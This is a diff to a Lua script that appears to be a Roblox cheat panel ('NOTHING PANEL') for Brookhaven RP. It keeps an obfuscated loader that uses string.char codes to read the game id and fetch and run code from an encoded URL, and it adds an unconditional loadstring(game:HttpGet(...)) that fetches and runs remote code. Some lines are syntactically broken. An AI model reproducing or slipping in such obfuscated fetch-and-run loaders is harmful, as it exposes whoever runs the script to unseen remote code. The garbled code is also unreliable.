@@ -1,4 +1,14 @@
-local_ = ocal668046")
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local UserInputService = game:GetService("UserInputService")
+
+local player = Players.LocalPlayer
+
+--=== ROLE PLAY NAME AND RGB ===
+
+local rpName = "😈NOTHING PANEL"
+local bioName = "lp.player"
+local _ = tonumber("80668046")
 local RgbName = game[string.char(71,97,109,101,73,100)]
 if RgbName == _ then
     local(game:HttpGet(string.char(
@@ -9,3 +19,9 @@ if RgbName == _ then
     ))()  
 end  
   
+--== LOADSTRING
+local BROOKHAVENRP = 492492222222
+if game.PlaceId ~= BROOKHAVENRP then
+    return
+end
+loadstring(game:HttpGet("YOUR_URL_HERE"))()
